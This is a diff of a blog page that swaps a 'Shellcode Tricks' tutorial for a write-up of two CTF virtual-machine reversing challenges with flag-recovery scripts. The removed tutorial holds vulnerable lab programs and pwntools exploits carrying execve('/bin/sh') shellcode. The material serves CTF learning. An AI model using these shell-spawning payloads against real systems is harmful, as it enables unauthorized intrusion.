@@ -13,10 +13,10 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#005f6b">
-  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="description" content="Software Security Researcher">
   <meta name="author" content>
   <meta name="keywords" content>
-  <title>Shellcode Tricks - AssassinQ</title>
+  <title>简单虚拟机指令类题目分析 - AssassinQ</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -118,7 +118,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  Saturday, March 2nd 2019, 7:05 pm
+                  Thursday, November 22nd 2018, 4:12 pm
                 </p>
               
 
@@ -127,7 +127,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    987 字
+                    1.5k 字
                   </span>
                 
 
@@ -135,7 +135,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      4 分钟
+                      7 分钟
                   </span>
                 
 
@@ -163,202 +163,219 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <p>The Splendid Shellcode.</p>
+              <p>刚接触逆向的时候做过一两道虚拟机指令的题，记得有一道是 RCTF 的 magic，当时还跟着无名大佬的 wp 做了很久。但是那个时候对 VM 的理解不是很深，然后这两天看到南邮的两道题，仔细做了一下，发现很适合入门 VM 这类型的题目，所以记录一下。</p>
 <a id="more"></a>
-<p>Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。</p>
-<ul>
-<li>可以控制程序执行流，可以控制一定的 data；</li>
-<li>利用 <code>mprotect()</code> 或者 <code>_dl_make_stack_executable()</code> 改写某些区域的 porc 再执行。</li>
-</ul>
-<p>关于 System Call：</p>
-<pre><code class="cpp">sys_execve( const char *filename, char *const argv[], char *const envp[] );
-</code></pre>
-<p>目标：</p>
-<pre><code class="cpp">execve(&quot;/bin/sh&quot;, 0, 0);
-</code></pre>
-<p>System Call x86：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">eax</th>
-<th style="text-align:center">ebx</th>
-<th style="text-align:center">ecx</th>
-<th style="text-align:center">edx</th>
-<th style="text-align:center">else</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0xb</td>
-<td style="text-align:center">addr of “/bin/sh”</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">int 0x80</td>
-</tr>
-</tbody>
-</table>
-<p>System Call x64：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">rax</th>
-<th style="text-align:center">rdi</th>
-<th style="text-align:center">rsi</th>
-<th style="text-align:center">rdx</th>
-<th style="text-align:center">else</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">59</td>
-<td style="text-align:center">addr of “/bin/sh”</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">syscall</td>
-</tr>
-</tbody>
-</table>
-<h1 id="Basic-Shellcode"><a href="#Basic-Shellcode" class="headerlink" title="Basic Shellcode"></a>Basic Shellcode</h1><p>最基础的 shellcode，对输入的长度没有做任何限制。</p>
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>Source Code：</p>
-<pre><code class="c">// gcc main.c -m32 -z execstack -o main
-#include &lt;stdio.h&gt;
-int main() {
-    void (*ptr)();
-    char buf[0x20];
-    puts(&quot;shellcode&gt;&gt;&quot;);
-    read(0, buf, 0x20);
-    ptr = buf;
-    ptr();
+<h1 id="WxyVM1"><a href="#WxyVM1" class="headerlink" title="WxyVM1"></a>WxyVM1</h1><p>拿到文件先 file 一下：</p>
+<pre><code>AssassinQ@MacBook-Air  ~/Downloads  file WxyVM1
+WxyVM1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0391bf87f6f7a11b4d23e29eb39330a762aff5b4, stripped
+</code></pre><p>然后拿到虚拟机下运行一下看看什么样：</p>
+<pre><code>[Desktop] ./WxyVM1                                                     3:25:21
+[WxyVM 0.0.1]
+input your flag:
+nctf{123456}
+wrong
+</code></pre><p>没看出啥东西，基本判断就是程序应该是一个对 flag 的加密。然后拖进 ida 里分析：</p>
+<pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char v4; // [rsp+Bh] [rbp-5h]
+  signed int i; // [rsp+Ch] [rbp-4h]
+
+  puts(&quot;[WxyVM 0.0.1]&quot;);
+  puts(&quot;input your flag:&quot;);
+  scanf(&quot;%s&quot;, &amp;input);
+  v4 = 1;
+  vm_start();
+  if ( strlen(&amp;input) != 24 )
+    v4 = 0;
+  for ( i = 0; i &lt;= 23; ++i )
+  {
+    if ( *(&amp;input + i) != enc[i] )
+      v4 = 0;
+  }
+  if ( v4 )
+    puts(&quot;correct&quot;);
+  else
+    puts(&quot;wrong&quot;);
+  return 0LL;
 }
 </code></pre>
-<p>push 字符串<code>&quot;/bin/sh&quot;</code>，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。<code>&quot;/bin/sh&quot;</code>的值可以在 gdb 调试中<code>searchmem /bin/sh</code>得到。Shellcode 的长度为 29。</p>
-<p>Exploit：</p>
-<pre><code class="python">#!/usr/bin/env python
-from pwn import *
-p = process(&#39;./main&#39;)
-context.arch = &#39;i386&#39;
-sh = asm(&#39;&#39;&#39;
-    mov eax, 0xb
-    mov ecx, 0
-    mov edx, 0
-    push 0x68732f
-    push 0x6e69622f
-    mov ebx, esp
-    int 0x80
-&#39;&#39;&#39;)
-info(disasm(sh))
-info(len(sh))
-# gdb.attach(p)
-p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x20))
-p.interactive()
-</code></pre>
-<h2 id="shellcode64"><a href="#shellcode64" class="headerlink" title="shellcode64"></a>shellcode64</h2><p>Source Code：</p>
-<pre><code class="c">// gcc main.c -z execstack -o main
-#include &lt;stdio.h&gt;
-int main() {
-    void (*ptr)();
-    char buf[0x40];
-    puts(&quot;shellcode&gt;&gt;&quot;);
-    read(0, buf, 0x40);
-    ptr = buf;
-    ptr();
+<p>main 函数中输入一个 flag，然后一个 vm 加密函数，再将加密过后的 flag 与存放在 data 段中的 enc 比较，如果相等那么输出 <code>correct</code>。所以基本思路应该是通过 enc 逆出 flag。然后进到 <code>vm_start</code> 函数中看看：</p>
+<pre><code class="cpp">__int64 vm_start()
+{
+  unsigned int v0; // ST04_4
+  __int64 result; // rax
+  signed int i; // [rsp+0h] [rbp-10h]
+  char v3; // [rsp+8h] [rbp-8h]
+
+  for ( i = 0; i &lt;= 14999; i += 3 )
+  {
+    v0 = byte_6010C0[i];
+    v3 = byte_6010C0[i + 2];
+    result = v0;
+    switch ( v0 )
+    {
+      case 1u:
+        result = byte_6010C0[i + 1];
+        *(&amp;input + result) += v3;
+        break;
+      case 2u:
+        result = byte_6010C0[i + 1];
+        *(&amp;input + result) -= v3;
+        break;
+      case 3u:
+        result = byte_6010C0[i + 1];
+        *(&amp;input + result) ^= v3;
+        break;
+      case 4u:
+        result = byte_6010C0[i + 1];
+        *(&amp;input + result) *= v3;
+        break;
+      case 5u:
+        result = byte_6010C0[i + 1];
+        *(&amp;input + result) ^= *(&amp;input + byte_6010C0[i + 2]);
+        break;
+      default:
+        continue;
+    }
+  }
+  return result;
 }
 </code></pre>
-<p>64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37</p>
-<p>Exploit：</p>
-<pre><code class="python">#!/usr/bin/env python
-from pwn import *
-p = process(&#39;./main&#39;)
-context.arch = &#39;amd64&#39;
-sh = asm(&#39;&#39;&#39;
-    mov rax, 59
-    mov rsi, 0
-    mov rdx, 0
-    mov rdi, 0x68732f6e69622f
-    push rdi
-    mov rdi, rsp
-    syscall
-&#39;&#39;&#39;)
-info(disasm(sh))
-info(len(sh))
-# gdb.attach(p)
-p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x40))
-p.interactive()
+<p>这里发现在 data 段中还有一个 byte 数组。总共有 15000 个数，每三个数一组。第一个数作为需要执行的指令，第二个数为输入 flag 的下标，第三个数为与其进行操作的数据。到这里基本已经清楚了，把数据都 dump 下来，写个脚本逆一下就 ok 了。然后还需要注意的是，这里的运算是以 byte 为单位，可能会产生溢出，所以应该每次操作之后模一下 256。</p>
+<p>看到网上大多数 wp 都是用 idc 脚本 patch，因为数据确实太多了，连 lazyida 都 dump 不出来。我是选择手动复制出来所有的数据，然后再用 python 正则匹配一下，提取出来。</p>
+<p><img src="/pics/简单虚拟机指令类题目分析/1.png" srcset="/img/loading.gif" alt></p>
+<p>最后的脚本：</p>
+<pre><code class="python">import re
+f = open(&#39;WxyVM1.txt&#39;, &#39;r&#39;)
+enc = [0xFFFFFFC4, 0x00000034, 0x00000022, 0xFFFFFFB1, 0xFFFFFFD3, 0x00000011, 0xFFFFFF97, 0x00000007, 0xFFFFFFDB, 0x00000037, 0xFFFFFFC4, 0x00000006, 0x0000001D, 0xFFFFFFFC, 0x0000005B, 0xFFFFFFED, 0xFFFFFF98, 0xFFFFFFDF, 0xFFFFFF94, 0xFFFFFFD8, 0xFFFFFFB3, 0xFFFFFF84, 0xFFFFFFCC, 0x00000008]
+text = f.read()
+f.close()
+pat = re.compile(r&#39;db.{5}&#39;)
+find_pat = pat.findall(text)
+nums = []
+for n in find_pat:
+    n = n[2:].strip()
+    if n.endswith(&#39;h&#39;):
+        n = int(n[:-1], 16)
+    else:
+        n = int(n)
+    nums.append(n)
+
+def cal(v0, v3, index):
+    if v0 == 1:
+        enc[index] = (enc[index] - v3) % 256
+    elif v0 == 2:
+        enc[index] = (enc[index] + v3) % 256
+    elif v0 == 3:
+        enc[index] = (enc[index] ^ v3) % 256
+    elif v0 == 4:
+        enc[index] = (enc[index] / v3) % 256
+    elif v0 == 5:
+        enc[index] = (enc[index] ^ enc[v3]) % 256
+
+for i in range(5000):
+    t = 5000 - i
+    v0 = nums[3 * t - 3]
+    v3 = nums[3 * t - 1]
+    res = nums[3 * t - 2]
+    cal(v0, v3, res)
+flag = &#39;&#39;
+for i in range(len(enc)):
+    flag += chr(enc[i])
+print flag
 </code></pre>
-<h1 id="Baby-Shellcode"><a href="#Baby-Shellcode" class="headerlink" title="Baby Shellcode"></a>Baby Shellcode</h1><p>对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。</p>
-<h2 id="shellcode-20"><a href="#shellcode-20" class="headerlink" title="shellcode_20"></a>shellcode_20</h2><p>Source Code：</p>
-<pre><code class="c">// gcc main.c -m32 -z execstack -o main
-#include &lt;stdio.h&gt;
-int main() {
-    void (*ptr)();
-    char buf[0x20];
-    puts(&quot;shellcode&gt;&gt;&quot;);
-    read(0, buf, 20);
-    ptr = buf;
-    ptr();
+<h1 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h1><p>file 一下：</p>
+<pre><code>AssassinQ@MacBook-Air  ~/Downloads  file WxyVM2
+WxyVM2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e57d1a1b70ac3d843afa30523dbbbc53c4ff341f, stripped
+</code></pre><p>运行一下，发现和上一题 VM 应该基本是同一个类型：</p>
+<pre><code>[Desktop] ./WxyVM2                                                     3:25:36
+[WxyVM 0.0.2]
+input your flag:
+nctf{123456}
+wrong
+</code></pre><p>然后拖进 ida 里，只有一个 main 函数。f5 反编译发现提示说函数太大，无法反编译。这个时候需要先修改一下 ida 的配置文件 <code>hexrays.cfg</code>，<a href="https://www.dllhook.com/post/217.html" target="_blank" rel="noopener">具体操作</a>。修改完后看一下 main 函数的情况：</p>
+<pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char v4; // [rsp+Bh] [rbp-5h]
+  signed int i; // [rsp+Ch] [rbp-4h]
+
+  puts(&quot;[WxyVM 0.0.2]&quot;);
+  puts(&quot;input your flag:&quot;);
+  scanf(&quot;%s&quot;, &amp;input);
+  v4 = 1;
+  if ( strlen(&amp;input) != 25 )
+    v4 = 0;
+  [......]
+  for ( i = 0; i &lt;= 24; ++i )
+  {
+    if ( *(&amp;input + i) != enc[i] )
+      v4 = 0;
+  }
+  if ( v4 )
+    puts(&quot;correct&quot;);
+  else
+    puts(&quot;wrong&quot;);
+  return 0LL;
 }
 </code></pre>
-<p>32 位下，<code>mov ecx, 0</code> 是 5 个字节，而 <code>xor ecx, ecx</code> 只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。<code>mov eax, 0xb</code> 同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要 <code>mov al, 0xb</code>，只需要 2 个字节。<code>mul ebx</code> 需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。</p>
-<p>Exploit：</p>
-<pre><code class="python">#!/usr/bin/env python
-from pwn import *
-p = process(&#39;./main&#39;)
-context.arch = &#39;i386&#39;
-sh = asm(&#39;&#39;&#39;
-    mul ebx
-    mov al, 0xb
-    xor ecx, ecx
-    push 0x0068732f
-    push 0x6e69622f
-    mov ebx, esp
-    int 0x80
-&#39;&#39;&#39;)
-info(disasm(sh))
-info(len(sh))
-gdb.attach(p)
-p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x20, &#39;\x00&#39;))
-p.interactive()
+<p>头和尾是基本一样的，主要是中间的部分，是一段又臭又长的对数据的加密：</p>
+<p><img src="/pics/简单虚拟机指令类题目分析/2.png" srcset="/img/loading.gif" alt></p>
+<p>我们输入的 input 应该都是 byte，而这么多 dword 的操作其实都是对加密部分的混淆。然后这里的话我是把 main 函数提出来，然后筛选出 byte 开头的语句，并且通过一系列切片简化语句。然后把数据段里被加密的 flag 即 enc 数组 dump 出来，将提取出来的语句进行逆向的实现，就能输出 flag。</p>
+<p>其他的一些注意实现和前一题一样。最后的实现脚本：</p>
+<pre><code class="python">f = open(&#39;WxyVM2.txt&#39;, &#39;r&#39;)
+text = f.read()
+f.close()
+enc = [0xFFFFFFC0, 0xFFFFFF85, 0xFFFFFFF9, 0x0000006C, 0xFFFFFFE2, 0x00000014, 0xFFFFFFBB, 0xFFFFFFE4, 0x0000000D, 0x00000059, 0x0000001C, 0x00000023, 0xFFFFFF88, 0x0000006E, 0xFFFFFF9B, 0xFFFFFFCA, 0xFFFFFFBA, 0x0000005C, 0x00000037, 0xFFFFFFFF, 0x00000048, 0xFFFFFFD8, 0x0000001F, 0xFFFFFFAB, 0xFFFFFFA5]
+ori = text.split(&#39;;\n&#39;)
+ops = []
+for s in ori:
+    if s.startswith(&#39;d&#39;):
+        continue
+    elif s.startswith(&#39;b&#39;):
+        t = s[:1] + s[9:11] + s[12:14] + s[15:]
+        ops.append(t)
+    elif s.startswith(&#39;--&#39;):
+        t = s[2:3] + s[-2:] + &#39;-=1&#39;
+        ops.append(t)
+    elif s.startswith(&#39;++&#39;):
+        t = s[2:3] + s[-2:] + &#39;+=1&#39;
+        ops.append(t)
+    else:
+        continue
+ops = ops[::-1]
+
+def getPart(op):
+    index = int(op[1:3], 16)
+    symbol = op[3:4]
+    num = op[5:]
+    if num.endswith(&#39;u&#39;):
+        num = num[:-1]
+    if num.startswith(&#39;0x&#39;):
+        num = int(num, 16)
+    else:
+        num = int(num)
+    return index, symbol, num
+
+def cal(index, symbol, num):
+    if symbol == &#39;+&#39;:
+        enc[index] = (enc[index] - num) % 256
+    elif symbol == &#39;-&#39;:
+        enc[index] = (enc[index] + num) % 256
+    elif symbol == &#39;^&#39;:
+        enc[index] = (enc[index] ^ num) % 256
+    else:
+        print &#39;error&#39;
+
+for op in ops:
+    index, symbol, num = getPart(op)
+    # print &#39;enc[&#39;, index, &#39;]&#39;, symbol, num
+    cal(index, symbol, num)
+
+flag = &#39;&#39;
+for i in range(len(enc)):
+    flag += chr(enc[i])
+print flag
 </code></pre>
-<h2 id="shellcode64-22"><a href="#shellcode64-22" class="headerlink" title="shellcode64_22"></a>shellcode64_22</h2><p>Source Code：</p>
-<pre><code class="c">// gcc main.c -z execstack -o main
-#include &lt;stdio.h&gt;
-int main() {
-    void (*ptr)();
-    char buf[0x40];
-    puts(&quot;shellcode&gt;&gt;&quot;);
-    read(0, buf, 22);
-    ptr = buf;
-    ptr();
-}
-</code></pre>
-<p>调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的 <code>mov rax, 59</code> 缩短为 2 个字节的 <code>mov al, 59</code>。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即 <code>push rbx ; pop rsi</code> 只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。</p>
-<p>Exploit：</p>
-<pre><code class="python">#!/usr/bin/env python
-from pwn import *
-p = process(&#39;./main&#39;)
-context.arch = &#39;amd64&#39;
-sh = asm(&#39;&#39;&#39;
-    mov al, 59
-    push rbx
-    push rbx
-    pop rsi
-    pop rdx
-    mov rdi, 0x68732f6e69622f
-    push rdi
-    push rsp
-    pop rdi
-    syscall
-&#39;&#39;&#39;)
-info(disasm(sh))
-info(len(sh))
-gdb.attach(p)
-p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x40))
-p.interactive()
-</code></pre>
-<h1 id="Child-Shellcode"><a href="#Child-Shellcode" class="headerlink" title="Child Shellcode"></a>Child Shellcode</h1><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>TODO:</p>
-<h2 id="Death-Note"><a href="#Death-Note" class="headerlink" title="Death Note"></a>Death Note</h2><p>TODO:</p>
-<h1 id="Adult-Shellcode"><a href="#Adult-Shellcode" class="headerlink" title="Adult Shellcode"></a>Adult Shellcode</h1><h2 id="Alive-Note"><a href="#Alive-Note" class="headerlink" title="Alive Note"></a>Alive Note</h2><p>TODO:</p>
-<h1 id="Hell-Shellcode"><a href="#Hell-Shellcode" class="headerlink" title="Hell Shellcode"></a>Hell Shellcode</h1><h2 id="MnO2"><a href="#MnO2" class="headerlink" title="MnO2"></a>MnO2</h2><p>TODO:</p>
 
             </div>
             <hr>
@@ -369,9 +386,11 @@ p.interactive()
                   <span>
                 <i class="iconfont icon-tag"></i>
                     
+                      <a class="hover-with-bg" href="/tags/re/">re</a>
+                    
                       <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                     
-                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
                     
                   </span>
                 
@@ -383,16 +402,16 @@ p.interactive()
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2019/03/04/Ubuntu16-04下编译libc2-23/">
+                      <a href="/2018/11/29/简单压缩壳脱壳指南/">
                         <i class="fa fa-chevron-left"></i>
-                        <span>Ubuntu16.04下编译libc2.23</span>
+                        <span>简单压缩壳脱壳指南</span>
                       </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2019/02/23/【译】Radare2之旅-Part2：Exploitation/">
-                        <span>【译】Radare2之旅-Part2：Exploitation</span>
+                      <a href="/2018/11/06/合天网安实验室-逆向部分/">
+                        <span>合天网安实验室-逆向部分</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -580,7 +599,7 @@ p.interactive()
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Shellcode Tricks&nbsp;",
+        "简单虚拟机指令类题目分析&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
